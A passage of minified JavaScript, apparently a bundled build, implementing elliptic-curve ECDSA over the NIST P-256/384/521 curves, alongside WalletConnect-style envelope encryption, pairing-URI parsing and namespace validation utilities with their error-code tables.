j=r.add(j,j),U=r.mul(m,T),U=r.add(U,U),A=r.mul(D,U),R=r.mul(y,L),R=r.add(A,R),A=r.sub(q,R),R=r.add(q,R),R=r.mul(A,R),A=r.mul(j,A),U=r.mul(y,U),L=r.mul(D,L),j=r.sub(M,L),j=r.mul(D,j),j=r.add(j,U),U=r.add(M,M),M=r.add(U,M),M=r.add(M,L),M=r.mul(M,j),R=r.add(R,M),L=r.mul(I,T),L=r.add(L,L),M=r.mul(L,j),A=r.sub(A,M),U=r.mul(L,q),U=r.add(U,U),U=r.add(U,U),new $(A,R,U)}add(D){b(D);const{X:P,Y:y,Z:m}=this,{X:I,Y:T,Z:A}=D;let R=r.ZERO,U=r.ZERO,M=r.ZERO;const q=s.a,L=r.mul(s.b,is);let j=r.mul(P,I),K=r.mul(y,T),G=r.mul(m,A),Z=r.add(P,y),H=r.add(I,T);Z=r.mul(Z,H),H=r.add(j,K),Z=r.sub(Z,H),H=r.add(P,m);let Y=r.add(I,A);return H=r.mul(H,Y),Y=r.add(j,G),H=r.sub(H,Y),Y=r.add(y,m),R=r.add(T,A),Y=r.mul(Y,R),R=r.add(K,G),Y=r.sub(Y,R),M=r.mul(q,H),R=r.mul(L,G),M=r.add(R,M),R=r.sub(K,M),M=r.add(K,M),U=r.mul(R,M),K=r.add(j,j),K=r.add(K,j),G=r.mul(q,G),H=r.mul(L,H),K=r.add(K,G),G=r.sub(j,G),G=r.mul(q,G),H=r.add(H,G),j=r.mul(K,H),U=r.add(U,j),j=r.mul(Y,H),R=r.mul(Z,R),R=r.sub(R,j),j=r.mul(Z,K),M=r.mul(Y,M),M=r.add(M,j),new $(R,U,M)}subtract(D){return this.add(D.negate())}is0(){return this.equals($.ZERO)}multiply(D){const{endo:P}=e;if(!i.isValidNot0(D))throw new Error("invalid scalar: out of range");let y,m;const I=T=>E.cached(this,T,A=>Qo($,A));if(P){const{k1neg:T,k1:A,k2neg:R,k2:U}=x(D),{p:M,f:q}=I(A),{p:L,f:j}=I(U);m=q.add(j),y=k(P.beta,M,L,T,R)}else{const{p:T,f:A}=I(D);y=T,m=A}return Qo($,[y,m])[0]}multiplyUnsafe(D){const{endo:P}=e,y=this;if(!i.isValid(D))throw new Error("invalid scalar: out of range");if(D===on||y.is0())return $.ZERO;if(D===Tr)return y;if(E.hasCache(this))return this.multiply(D);if(P){const{k1neg:m,k1:I,k2neg:T,k2:A}=x(D),{p1:R,p2:U}=fI($,y,I,A);return k(P.beta,R,U,m,T)}else return E.unsafe(y,D)}multiplyAndAddUnsafe(D,P,y){const m=this.multiplyUnsafe(P).add(D.multiplyUnsafe(y));return m.is0()?void 0:m}toAffine(D){return O(this,D)}isTorsionFree(){const{isTorsionFree:D}=e;return o===Tr?!0:D?D($,this):E.unsafe(this,a).is0()}clearCofactor(){const{clearCofactor:D}=e;return o===Tr?this:D?D($,this):this.multiplyUnsafe(o)}isSmallOrder(){return this.multiplyUnsafe(o).is0()}toBytes(D=!0){return Rs(D,"isCompressed"),this.assertValidity(),p($,this,D)}toHex(D=!0){return Pr(this.toBytes(D))}toString(){return`<Point ${this.is0()?"ZERO":this.toHex()}>`}get px(){return this.X}get py(){return this.X}get pz(){return this.Z}toRawBytes(D=!0){return this.toBytes(D)}_setWindowSize(D){this.precompute(D)}static normalizeZ(D){return Qo($,D)}static msm(D,P){return dI($,i,D,P)}static fromPrivateKey(D){return $.BASE.multiply(Or(i,D))}}$.BASE=new $(s.Gx,s.Gy,r.ONE),$.ZERO=new $(r.ZERO,r.ONE,r.ZERO),$.Fp=r,$.Fn=i;const N=i.BITS,E=new hI($,e.endo?Math.ceil(N/2):N);return $.BASE.precompute(8),$}function hg(t){return Uint8Array.of(t?2:3)}function fg(t,e){return{secretKey:e.BYTES,publicKey:1+t.BYTES,publicKeyUncompressed:1+2*t.BYTES,publicKeyHasPrefix:!0,signature:2*e.BYTES}}function OI(t,e={}){const{Fn:n}=t,r=e.randomBytes||ur,i=Object.assign(fg(t.Fp,n),{seed:og(n.ORDER)});function s(f){try{return!!Or(n,f)}catch{return!1}}function o(f,p){const{publicKey:d,publicKeyUncompressed:g}=i;try{const w=f.length;return p===!0&&w!==d||p===!1&&w!==g?!1:!!t.fromBytes(f)}catch{return!1}}function a(f=r(i.seed)){return cI(Yn(f,i.seed,"seed"),n.ORDER)}function c(f,p=!0){return t.BASE.multiply(Or(n,f)).toBytes(p)}function l(f){const p=a(f);return{secretKey:p,publicKey:c(p)}}function u(f){if(typeof f=="bigint")return!1;if(f instanceof t)return!0;const{secretKey:p,publicKey:d,publicKeyUncompressed:g}=i;if(n.allowedLengths||p===d)return;const w=Ve("key",f).length;return w===d||w===g}function h(f,p,d=!0){if(u(f)===!0)throw new Error("first arg must be private key");if(u(p)===!1)throw new Error("second arg must be public key");const g=Or(n,f);return t.fromHex(p).multiply(g).toBytes(d)}return Object.freeze({getPublicKey:c,getSharedSecret:h,keygen:l,Point:t,utils:{isValidSecretKey:s,isValidPublicKey:o,randomSecretKey:a,isValidPrivateKey:s,randomPrivateKey:a,normPrivateKeyToScalar:f=>Or(n,f),precompute(f=8,p=t.BASE){return p.precompute(f,!1)}},lengths:i})}function $I(t,e,n={}){Js(e),so(n,{},{hmac:"function",lowS:"boolean",randomBytes:"function",bits2int:"function",bits2int_modN:"function"});const r=n.randomBytes||ur,i=n.hmac||((P,...y)=>no(e,P,Dn(...y))),{Fp:s,Fn:o}=t,{ORDER:a,BITS:c}=o,{keygen:l,getPublicKey:u,getSharedSecret:h,utils:f,lengths:p}=OI(t,n),d={prehash:!1,lowS:typeof n.lowS=="boolean"?n.lowS:!1,format:void 0,extraEntropy:!1},g="compact";function w(P){const y=a>>Tr;return P>y}function _(P,y){if(!o.isValidNot0(y))throw new Error(`invalid signature ${P}: out of range 1..Point.Fn.ORDER`);return y}function C(P,y){Ga(y);const m=p.signature,I=y==="compact"?m:y==="recovered"?m+1:void 0;return Yn(P,I,`${y} signature`)}class v{constructor(y,m,I){this.r=_("r",y),this.s=_("s",m),I!=null&&(this.recovery=I),Object.freeze(this)}static fromBytes(y,m=g){C(y,m);let I;if(m==="der"){const{r:U,s:M}=nn.toSig(Yn(y));return new v(U,M)}m==="recovered"&&(I=y[0],m="compact",y=y.subarray(1));const T=o.BYTES,A=y.subarray(0,T),R=y.subarray(T,T*2);return new v(o.fromBytes(A),o.fromBytes(R),I)}static fromHex(y,m){return this.fromBytes(Ts(y),m)}addRecoveryBit(y){return new v(this.r,this.s,y)}recoverPublicKey(y){const m=s.ORDER,{r:I,s:T,recovery:A}=this;if(A==null||![0,1,2,3].includes(A))throw new Error("recovery id invalid");if(a*ug<m&&A>1)throw new Error("recovery id is ambiguous for h>1 curve");const R=A===2||A===3?I+a:I;if(!s.isValid(R))throw new Error("recovery id 2 or 3 invalid");const U=s.toBytes(R),M=t.fromBytes(Dn(hg((A&1)===0),U)),q=o.inv(R),L=x(Ve("msgHash",y)),j=o.create(-L*q),K=o.create(T*q),G=t.BASE.multiplyUnsafe(j).add(M.multiplyUnsafe(K));if(G.is0())throw new Error("point at infinify");return G.assertValidity(),G}hasHighS(){return w(this.s)}toBytes(y=g){if(Ga(y),y==="der")return Ts(nn.hexFromSig(this));const m=o.toBytes(this.r),I=o.toBytes(this.s);if(y==="recovered"){if(this.recovery==null)throw new Error("recovery bit must be present");return Dn(Uint8Array.of(this.recovery),m,I)}return Dn(m,I)}toHex(y){return Pr(this.toBytes(y))}assertValidity(){}static fromCompact(y){return v.fromBytes(Ve("sig",y),"compact")}static fromDER(y){return v.fromBytes(Ve("sig",y),"der")}normalizeS(){return this.hasHighS()?new v(this.r,o.neg(this.s),this.recovery):this}toDERRawBytes(){return this.toBytes("der")}toDERHex(){return Pr(this.toBytes("der"))}toCompactRawBytes(){return this.toBytes("compact")}toCompactHex(){return Pr(this.toBytes("compact"))}}const b=n.bits2int||function(P){if(P.length>8192)throw new Error("input is too large");const y=io(P),m=P.length*8-c;return m>0?y>>BigInt(m):y},x=n.bits2int_modN||function(P){return o.create(b(P))},O=Mi(c);function B(P){return Ka("num < 2^"+c,P,on,O),o.toBytes(P)}function k(P,y){return Yn(P,void 0,"message"),y?Yn(e(P),void 0,"prehashed message"):P}function $(P,y,m){if(["recovered","canonical"].some(K=>K in m))throw new Error("sign() legacy options not supported");const{lowS:I,prehash:T,extraEntropy:A}=ra(m,d);P=k(P,T);const R=x(P),U=Or(o,y),M=[B(U),B(R)];if(A!=null&&A!==!1){const K=A===!0?r(p.secretKey):A;M.push(Ve("extraEntropy",K))}const q=Dn(...M),L=R;function j(K){const G=b(K);if(!o.isValidNot0(G))return;const Z=o.inv(G),H=t.BASE.multiply(G).toAffine(),Y=o.create(H.x);if(Y===on)return;const te=o.create(Z*o.create(L+Y*U));if(te===on)return;let ue=(H.x===Y?0:2)|Number(H.y&Tr),pe=te;return I&&w(te)&&(pe=o.neg(te),ue^=1),new v(Y,pe,ue)}return{seed:q,k2sig:j}}function N(P,y,m={}){P=Ve("message",P);const{seed:I,k2sig:T}=$(P,y,m);return Q_(e.outputLen,o.BYTES,i)(I,T)}function E(P){let y;const m=typeof P=="string"||Xs(P),I=!m&&P!==null&&typeof P=="object"&&typeof P.r=="bigint"&&typeof P.s=="bigint";if(!m&&!I)throw new Error("invalid signature, expected Uint8Array, hex string or Signature instance");if(I)y=new v(P.r,P.s);else if(m){try{y=v.fromBytes(Ve("sig",P),"der")}catch(T){if(!(T instanceof nn.Err))throw T}if(!y)try{y=v.fromBytes(Ve("sig",P),"compact")}catch{return!1}}return y||!1}function S(P,y,m,I={}){const{lowS:T,prehash:A,format:R}=ra(I,d);if(m=Ve("publicKey",m),y=k(Ve("message",y),A),"strict"in I)throw new Error("options.strict was renamed to lowS");const U=R===void 0?E(P):v.fromBytes(Ve("sig",P),R);if(U===!1)return!1;try{const M=t.fromBytes(m);if(T&&U.hasHighS())return!1;const{r:q,s:L}=U,j=x(y),K=o.inv(L),G=o.create(j*K),Z=o.create(q*K),H=t.BASE.multiplyUnsafe(G).add(M.multiplyUnsafe(Z));return H.is0()?!1:o.create(H.x)===q}catch{return!1}}function D(P,y,m={}){const{prehash:I}=ra(m,d);return y=k(y,I),v.fromBytes(P,"recovered").recoverPublicKey(y).toBytes()}return Object.freeze({keygen:l,getPublicKey:u,getSharedSecret:h,utils:f,lengths:p,Point:t,sign:N,verify:S,recoverPublicKey:D,Signature:v,hash:e})}function CI(t){const e={a:t.a,b:t.b,p:t.Fp.ORDER,n:t.n,h:t.h,Gx:t.Gx,Gy:t.Gy},n=t.Fp;let r=t.allowedPrivateKeyLengths?Array.from(new Set(t.allowedPrivateKeyLengths.map(o=>Math.ceil(o/2)))):void 0;const i=Rn(e.n,{BITS:t.nBitLength,allowedLengths:r,modFromBytes:t.wrapPrivateKey}),s={Fp:n,Fn:i,allowInfinityPoint:t.allowInfinityPoint,endo:t.endo,isTorsionFree:t.isTorsionFree,clearCofactor:t.clearCofactor,fromBytes:t.fromBytes,toBytes:t.toBytes};return{CURVE:e,curveOpts:s}}function PI(t){const{CURVE:e,curveOpts:n}=CI(t),r={hmac:t.hmac,randomBytes:t.randomBytes,lowS:t.lowS,bits2int:t.bits2int,bits2int_modN:t.bits2int_modN};return{CURVE:e,curveOpts:n,hash:t.hash,ecdsaOpts:r}}function TI(t,e){const n=e.Point;return Object.assign({},e,{ProjectivePoint:n,CURVE:Object.assign({},t,ig(n.Fn.ORDER,n.Fn.BITS))})}function BI(t){const{CURVE:e,curveOpts:n,hash:r,ecdsaOpts:i}=PI(t),s=AI(e,n),o=$I(s,r,i);return TI(t,o)}function Ya(t,e){const n=r=>BI({...t,hash:r});return{...n(e),create:n}}const dg={p:BigInt("0xffffffff00000001000000000000000000000000ffffffffffffffffffffffff"),n:BigInt("0xffffffff00000000ffffffffffffffffbce6faada7179e84f3b9cac2fc632551"),h:BigInt(1),a:BigInt("0xffffffff00000001000000000000000000000000fffffffffffffffffffffffc"),b:BigInt("0x5ac635d8aa3a93e7b3ebbd55769886bc651d06b0cc53b0f63bce3c3e27d2604b"),Gx:BigInt("0x6b17d1f2e12c4247f8bce6e563a440f277037d812deb33a0f4a13945d898c296"),Gy:BigInt("0x4fe342e2fe1a7f9b8ee7eb4a7c0f9e162bce33576b315ececbb6406837bf51f5")},pg={p:BigInt("0xfffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffeffffffff0000000000000000ffffffff"),n:BigInt("0xffffffffffffffffffffffffffffffffffffffffffffffffc7634d81f4372ddf581a0db248b0a77aecec196accc52973"),h:BigInt(1),a:BigInt("0xfffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffeffffffff0000000000000000fffffffc"),b:BigInt("0xb3312fa7e23ee7e4988e056be3f82d19181d9c6efe8141120314088f5013875ac656398d8a2ed19d2a85c8edd3ec2aef"),Gx:BigInt("0xaa87ca22be8b05378eb1c71ef320ad746e1d3b628ba79b9859f741e082542a385502f25dbf55296c3a545e3872760ab7"),Gy:BigInt("0x3617de4a96262c6f5d9e98bf9292dc29f8f41dbd289a147ce9da3113b5f0b8c00a60b1ce1d7e819d7a431d7c90ea0e5f")},gg={p:BigInt("0x1ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff"),n:BigInt("0x01fffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffa51868783bf2f966b7fcc0148f709a5d03bb5c9b8899c47aebb6fb71e91386409"),h:BigInt(1),a:BigInt("0x1fffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffc"),b:BigInt("0x0051953eb9618e1c9a1f929a21a0b68540eea2da725b99b315f3b8b489918ef109e156193951ec7e937b1652c0bd3bb1bf073573df883d2c34f1ef451fd46b503f00"),Gx:BigInt("0x00c6858e06b70404e9cd9e3ecb662395b4429c648139053fb521f828af606b4d3dbaa14b5e77efe75928fe1dc127a2ffa8de3348b3c1856a429bf97e7e31c2e5bd66"),Gy:BigInt("0x011839296a789a3bc0045c8a5fb42c7d1bd998f54449579b446817afbd17273e662c97ee72995ef42640c550b9013fad0761353c7086a272c24088be94769fd16650")},RI=Rn(dg.p),kI=Rn(pg.p),NI=Rn(gg.p),UI=Ya({...dg,Fp:RI,lowS:!1},eo);Ya({...pg,Fp:kI,lowS:!1},q3),Ya({...gg,Fp:NI,lowS:!1,allowedPrivateKeyLengths:[130,131,132]},j3);const MI=UI,yg="base10",Ye="base16",nt="base64pad",An="base64url",Li="utf8",mg=0,an=1,Fi=2,LI=0,Ih=1,gi=12,Zc=32;function FI(){const t=Ha.utils.randomPrivateKey(),e=Ha.getPublicKey(t);return{privateKey:st(t,Ye),publicKey:st(e,Ye)}}function Za(){const t=ur(Zc);return st(t,Ye)}function jI(t,e){const n=Ha.getSharedSecret(xt(t,Ye),xt(e,Ye)),r=X_(ro,n,void 0,void 0,Zc);return st(r,Ye)}function ps(t){const e=ro(xt(t,Ye));return st(e,Ye)}function bt(t){const e=ro(xt(t,Li));return st(e,Ye)}function wg(t){return xt(`${t}`,yg)}function or(t){return Number(st(t,yg))}function bg(t){return t.replace(/\+/g,"-").replace(/\//g,"_").replace(/=/g,"")}function vg(t){const e=t.replace(/-/g,"+").replace(/_/g,"/"),n=(4-e.length%4)%4;return e+"=".repeat(n)}function qI(t){const e=wg(typeof t.type<"u"?t.type:mg);if(or(e)===an&&typeof t.senderPublicKey>"u")throw new Error("Missing sender public key for type 1 envelope");const n=typeof t.senderPublicKey<"u"?xt(t.senderPublicKey,Ye):void 0,r=typeof t.iv<"u"?xt(t.iv,Ye):ur(gi),i=xt(t.symKey,Ye),s=Kp(i,r).encrypt(xt(t.message,Li)),o=Eg({type:e,sealed:s,iv:r,senderPublicKey:n});return t.encoding===An?bg(o):o}function zI(t){const e=xt(t.symKey,Ye),{sealed:n,iv:r}=Ai({encoded:t.encoded,encoding:t.encoding}),i=Kp(e,r).decrypt(n);if(i===null)throw new Error("Failed to decrypt");return st(i,Li)}function VI(t,e){const n=wg(Fi),r=ur(gi),i=xt(t,Li),s=Eg({type:n,sealed:i,iv:r});return e===An?bg(s):s}function WI(t,e){const{sealed:n}=Ai({encoded:t,encoding:e});return st(n,Li)}function Eg(t){if(or(t.type)===Fi)return st(pi([t.type,t.sealed]),nt);if(or(t.type)===an){if(typeof t.senderPublicKey>"u")throw new Error("Missing sender public key for type 1 envelope");return st(pi([t.type,t.senderPublicKey,t.iv,t.sealed]),nt)}return st(pi([t.type,t.iv,t.sealed]),nt)}function Ai(t){const e=(t.encoding||nt)===An?vg(t.encoded):t.encoded,n=xt(e,nt),r=n.slice(LI,Ih),i=Ih;if(or(r)===an){const c=i+Zc,l=c+gi,u=n.slice(i,c),h=n.slice(c,l),f=n.slice(l);return{type:r,sealed:f,iv:h,senderPublicKey:u}}if(or(r)===Fi){const c=n.slice(i),l=ur(gi);return{type:r,sealed:c,iv:l}}const s=i+gi,o=n.slice(i,s),a=n.slice(s);return{type:r,sealed:a,iv:o}}function KI(t,e){const n=Ai({encoded:t,encoding:e?.encoding});return xg({type:or(n.type),senderPublicKey:typeof n.senderPublicKey<"u"?st(n.senderPublicKey,Ye):void 0,receiverPublicKey:e?.receiverPublicKey})}function xg(t){const e=t?.type||mg;if(e===an){if(typeof t?.senderPublicKey>"u")throw new Error("missing sender public key");if(typeof t?.receiverPublicKey>"u")throw new Error("missing receiver public key")}return{type:e,senderPublicKey:t?.senderPublicKey,receiverPublicKey:t?.receiverPublicKey}}function Sh(t){return t.type===an&&typeof t.senderPublicKey=="string"&&typeof t.receiverPublicKey=="string"}function Dh(t){return t.type===Fi}function HI(t){const e=Buffer.from(t.x,"base64"),n=Buffer.from(t.y,"base64");return pi([new Uint8Array([4]),e,n])}function GI(t,e){const[n,r,i]=t.split("."),s=Buffer.from(vg(i),"base64");if(s.length!==64)throw new Error("Invalid signature length");const o=s.slice(0,32),a=s.slice(32,64),c=`${n}.${r}`,l=ro(c),u=HI(e);if(!MI.verify(pi([o,a]),l,u))throw new Error("Invalid signature");return Oa(t).payload}const YI="irn";function Us(t){return t?.relay||{protocol:YI}}function $r(t){const e=$x[t];if(typeof e>"u")throw new Error(`Relay Protocol not supported: ${t}`);return e}var ZI=Object.defineProperty,XI=Object.defineProperties,JI=Object.getOwnPropertyDescriptors,Ah=Object.getOwnPropertySymbols,QI=Object.prototype.hasOwnProperty,e8=Object.prototype.propertyIsEnumerable,Oh=(t,e,n)=>e in t?ZI(t,e,{enumerable:!0,configurable:!0,writable:!0,value:n}):t[e]=n,ia=(t,e)=>{for(var n in e||(e={}))QI.call(e,n)&&Oh(t,n,e[n]);if(Ah)for(var n of Ah(e))e8.call(e,n)&&Oh(t,n,e[n]);return t},t8=(t,e)=>XI(t,JI(e));function n8(t,e="-"){const n={},r="relay"+e;return Object.keys(t).forEach(i=>{if(i.startsWith(r)){const s=i.replace(r,""),o=t[i];n[s]=o}}),n}function $h(t){if(!t.includes("wc:")){const l=Sp(t);l!=null&&l.includes("wc:")&&(t=l)}t=t.includes("wc://")?t.replace("wc://",""):t,t=t.includes("wc:")?t.replace("wc:",""):t;const e=t.indexOf(":"),n=t.indexOf("?")!==-1?t.indexOf("?"):void 0,r=t.substring(0,e),i=t.substring(e+1,n).split("@"),s=typeof n<"u"?t.substring(n):"",o=new URLSearchParams(s),a=Object.fromEntries(o.entries()),c=typeof a.methods=="string"?a.methods.split(","):void 0;return{protocol:r,topic:r8(i[0]),version:parseInt(i[1],10),symKey:a.symKey,relay:n8(a),methods:c,expiryTimestamp:a.expiryTimestamp?parseInt(a.expiryTimestamp,10):void 0}}function r8(t){return t.startsWith("//")?t.substring(2):t}function i8(t,e="-"){const n="relay",r={};return Object.keys(t).forEach(i=>{const s=i,o=n+e+s;t[s]&&(r[o]=t[s])}),r}function Ch(t){const e=new URLSearchParams,n=ia(ia(t8(ia({},i8(t.relay)),{symKey:t.symKey}),t.expiryTimestamp&&{expiryTimestamp:t.expiryTimestamp.toString()}),t.methods&&{methods:t.methods.join(",")});return Object.entries(n).sort(([r],[i])=>r.localeCompare(i)).forEach(([r,i])=>{i!==void 0&&e.append(r,String(i))}),`${t.protocol}:${t.topic}@${t.version}?${e}`}function ss(t,e,n){return`${t}?wc_ev=${n}&topic=${e}`}var s8=Object.defineProperty,o8=Object.defineProperties,a8=Object.getOwnPropertyDescriptors,Ph=Object.getOwnPropertySymbols,c8=Object.prototype.hasOwnProperty,l8=Object.prototype.propertyIsEnumerable,Th=(t,e,n)=>e in t?s8(t,e,{enumerable:!0,configurable:!0,writable:!0,value:n}):t[e]=n,u8=(t,e)=>{for(var n in e||(e={}))c8.call(e,n)&&Th(t,n,e[n]);if(Ph)for(var n of Ph(e))l8.call(e,n)&&Th(t,n,e[n]);return t},h8=(t,e)=>o8(t,a8(e));function Vr(t){const e=[];return t.forEach(n=>{const[r,i]=n.split(":");e.push(`${r}:${i}`)}),e}function _g(t){const e=[];return Object.values(t).forEach(n=>{e.push(...Vr(n.accounts))}),[...new Set(e)]}function f8(t){const e=[];return Object.values(t).forEach(n=>{e.push(...n.methods)}),[...new Set(e)]}function d8(t){const e=[];return Object.values(t).forEach(n=>{e.push(...n.events)}),[...new Set(e)]}function p8(t,e){const n=[];return Object.values(t).forEach(r=>{Vr(r.accounts).includes(e)&&n.push(...r.methods)}),n}function g8(t,e){const n=[];return Object.values(t).forEach(r=>{Vr(r.accounts).includes(e)&&n.push(...r.events)}),n}function Ig(t){return t.includes(":")}function y8(t){return Ig(t)?t.split(":")[0]:t}function Bh(t){var e,n,r;const i={};if(!Oi(t))return i;for(const[s,o]of Object.entries(t)){const a=Ig(s)?[s]:o.chains,c=o.methods||[],l=o.events||[],u=y8(s);i[u]=h8(u8({},i[u]),{chains:nr(a,(e=i[u])==null?void 0:e.chains),methods:nr(c,(n=i[u])==null?void 0:n.methods),events:nr(l,(r=i[u])==null?void 0:r.events)})}return i}function m8(t){const e={};return t?.forEach(n=>{var r;const[i,s]=n.split(":");e[i]||(e[i]={accounts:[],chains:[],events:[],methods:[]}),e[i].accounts.push(n),(r=e[i].chains)==null||r.push(`${i}:${s}`)}),e}function Rh(t,e){e=e.map(r=>r.replace("did:pkh:",""));const n=m8(e);for(const[r,i]of Object.entries(n))i.methods?i.methods=nr(i.methods,t):i.methods=t,i.events=["chainChanged","accountsChanged"];return n}function w8(t,e){var n,r,i,s,o,a;const c=Bh(t),l=Bh(e),u={},h=Object.keys(c).concat(Object.keys(l));for(const f of h)u[f]={chains:nr((n=c[f])==null?void 0:n.chains,(r=l[f])==null?void 0:r.chains),methods:nr((i=c[f])==null?void 0:i.methods,(s=l[f])==null?void 0:s.methods),events:nr((o=c[f])==null?void 0:o.events,(a=l[f])==null?void 0:a.events)};return u}const b8={INVALID_METHOD:{message:"Invalid method.",code:1001},INVALID_EVENT:{message:"Invalid event.",code:1002},INVALID_UPDATE_REQUEST:{message:"Invalid update request.",code:1003},INVALID_EXTEND_REQUEST:{message:"Invalid extend request.",code:1004},INVALID_SESSION_SETTLE_REQUEST:{message:"Invalid session settle request.",code:1005},UNAUTHORIZED_METHOD:{message:"Unauthorized method.",code:3001},UNAUTHORIZED_EVENT:{message:"Unauthorized event.",code:3002},UNAUTHORIZED_UPDATE_REQUEST:{message:"Unauthorized update request.",code:3003},UNAUTHORIZED_EXTEND_REQUEST:{message:"Unauthorized extend request.",code:3004},USER_REJECTED:{message:"User rejected.",code:5e3},USER_REJECTED_CHAINS:{message:"User rejected chains.",code:5001},USER_REJECTED_METHODS:{message:"User rejected methods.",code:5002},USER_REJECTED_EVENTS:{message:"User rejected events.",code:5003},UNSUPPORTED_CHAINS:{message:"Unsupported chains.",code:5100},UNSUPPORTED_METHODS:{message:"Unsupported methods.",code:5101},UNSUPPORTED_EVENTS:{message:"Unsupported events.",code:5102},UNSUPPORTED_ACCOUNTS:{message:"Unsupported accounts.",code:5103},UNSUPPORTED_NAMESPACE_KEY:{message:"Unsupported namespace key.",code:5104},USER_DISCONNECTED:{message:"User disconnected.",code:6e3},SESSION_SETTLEMENT_FAILED:{message:"Session settlement failed.",code:7e3},WC_METHOD_UNSUPPORTED:{message:"Unsupported wc_ method.",code:10001}},v8={NOT_INITIALIZED:{message:"Not initialized.",code:1},NO_MATCHING_KEY:{message:"No matching key.",code:2},RESTORE_WILL_OVERRIDE:{message:"Restore will override.",code:3},RESUBSCRIBED:{message:"Resubscribed.",code:4},MISSING_OR_INVALID:{message:"Missing or invalid.",code:5},EXPIRED:{message:"Expired.",code:6},UNKNOWN_TYPE:{message:"Unknown type.",code:7},MISMATCHED_TOPIC:{message:"Mismatched topic.",code:8},NON_CONFORMING_NAMESPACES:{message:"Non conforming namespaces.",code:9}};function V(t,e){const{message:n,code:r}=v8[t];return{message:e?`${n} ${e}`:n,code:r}}function de(t,e){const{message:n,code:r}=b8[t];return{message:e?`${n} ${e}`:n,code:r}}function Mr(t,e){return Array.isArray(t)?typeof e<"u"&&t.length?t.every(e):!0:!1}function Oi(t){return Object.getPrototypeOf(t)===Object.prototype&&Object.keys(t).length}function $e(t){return typeof t>"u"}function be(t,e){return e&&$e(t)?!0:typeof t=="string"&&!!t.trim().length}function Xc(t,e){return typeof t=="number"&&!isNaN(t)}function E8(t,e){const{requiredNamespaces:n}=e,r=Object.keys(t.namespaces),i=Object.keys(n);let s=!0;return Gn(i,r)?(r.forEach(o=>{const{accounts:a,methods:c,events:l}=t.namespaces[o],u=Vr(a),h=n[o];(!Gn(vp(o,h),u)||!Gn(h.methods,c)||!Gn(h.events,l))&&(s=!1)}),s):!1}function Ms(t){return be(t,!1)&&t.includes(":")?t.split(":").length===2:!1}function x8(t){if(be(t,!1)&&t.includes(":")){const e=t.split(":");if(e.length===3){const n=e[0]+":"+e[1];return!!e[2]&&Ms(n)}}return!1}function _8(t){function e(n){try{return typeof new URL(n)<"u"}catch{return!1}}try{if(be(t,!1)){if(e(t))return!0;const n=Sp(t);return e(n)}}catch{}return!1}function I8(t){var e;return(e=t?.proposer)==null?void 0:e.publicKey}function S8(t){return t?.topic}function D8(t,e){let n=null;return be(t?.publicKey,!1)||(n=V("MISSING_OR_INVALID",`${e} controller public key should be a string`)),n}function kh(t){let e=!0;return Mr(t)?t.length&&(e=t.every(n=>be(n,!1))):e=!1,e}function A8(t,e,n){let r=null;return Mr(e)&&e.length?e.forEach(i=>{r||Ms(i)||(r=de("UNSUPPORTED_CHAINS",`${n}, chain ${i} should be a string and conform to "namespace:chainId" format`))}):Ms(t)||(r=de("UNSUPPORTED_CHAINS",`${n}, chains must be defined as "namespace:chainId" e.g. "eip155:1": {...} in the namespace key OR as an array of CAIP-2 chainIds e.g. eip155: { chains: ["eip155:1", "eip155:5"] }`)),r}function O8(t,e,n){let r=null;return Object.entries(t).forEach(([i,s])=>{if(r)return;const o=A8(i,vp(i,s),`${e} ${n}`);o&&(r=o)}),r}function $8(t,e){let n=null;return Mr(t)?t.forEach(r=>{n||x8(r)||(n=de("UNSUPPORTED_ACCOUNTS",`${e}, account ${r} should be a string and conform to "namespace:chainId:address" format`))}):n=de("UNSUPPORTED_ACCOUNTS",`${e}, accounts should be an array of strings conforming to "namespace:chainId:address" format`),n}function C8(t,e){let n=null;return Object.values(t).forEach(r=>{if(n)return;const i=$8(r?.accounts,`${e} namespace`);i&&(n=i)}),n}function P8(t,e){let n=null;return kh(t?.methods)?kh(t?.events)||(n=de("UNSUPPORTED_EVENTS",`${e}, events should be an array of strings or empty array for no events`)):n=de("UNSUPPORTED_METHODS",`${e}, methods should be an array of strings or empty array for no methods`),n}function Sg(t,e){let n=null;return Object.values(t).forEach(r=>{if(n)return;const i=P8(r,`${e}, namespace`);i&&(n=i)}),n}function T8(t,e,n){let r=null;if(t&&Oi(t)){const i=Sg(t,e);i&&(r=i);const s=O8(t,e,n);s&&(r=s)}else r=V("MISSING_OR_INVALID",`${e}, ${n} should be an object with data`);return r}function sa(t,e){let n=null;if(t&&Oi(t)){const r=Sg(t,e);r&&(n=r);const i=C8(t,e);i&&(n=i)}else n=V("MISSING_OR_INVALID",`${e}, namespaces should be an object with data`);return n}function Dg(t){return be(t.protocol,!0)}function B8(t,e){let n=!1;return t?t&&Mr(t)&&t.length&&t.forEach(r=>{n=Dg(r)}):n=!0,n}function R8(t){return typeof t=="number"}function Qe(t){return typeof t<"u"&&typeof t!==null}function k8(t){return!(!t||typeof t!="object"||!t.code||!Xc(t.code)||!t.message||!be(t.message,!1))}function N8(t){return!($e(t)||!be(t.method,!1))}function U8(t){return!($e(t)||$e(t.result)&&$e(t.error)||!Xc(t.id)||!be(t.jsonrpc,!1))}function M8(t){return!($e(t)||!be(t.name,!1))}function Nh(t,e){return!(!Ms(e)||!_g(t).includes(e))}function L8(t,e,n){return be(n,!1)?p8(t,e).includes(n):!1}function F8(t,e,n){return be(n,!1)?g8(t,e).includes(n):!1}function Uh(t,e,n){let r=null;const i=j8(t),s=q8(e),o=Object.keys(i),a=Object.keys(s),c=Mh(Object.keys(t)),l=Mh(Object.keys(e)),u=c.filter(h=>!l.includes(h));return u.length&&(r=V("NON_CONFORMING_NAMESPACES",`${n} namespaces keys don't satisfy requiredNamespaces.
      Required: ${u.toString()}
      Received: ${Object.keys(e).toString()}`)),Gn(o,a)||(r=V("NON_CONFORMING_NAMESPACES",`${n} namespaces chains don't satisfy required namespaces.
      Required: ${o.toString()}
      Approved: ${a.toString()}`)),Object.keys(e).forEach(h=>{if(!h.includes(":")||r)return;const f=Vr(e[h].accounts);f.includes(h)||(r=V("NON_CONFORMING_NAMESPACES",`${n} namespaces accounts don't satisfy namespace accounts for ${h}
        Required: ${h}
